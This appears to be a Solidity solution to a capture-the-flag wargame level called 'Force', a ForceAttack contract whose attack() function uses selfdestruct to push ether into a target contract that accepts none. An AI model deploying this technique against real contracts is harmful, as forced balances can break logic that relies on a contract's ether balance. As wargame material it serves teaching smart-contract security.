// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Force} from "../src/Force.sol";

contract ForceAttack {
    Force public force;

    constructor(address _forceAddress) {
        force = Force(_forceAddress);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
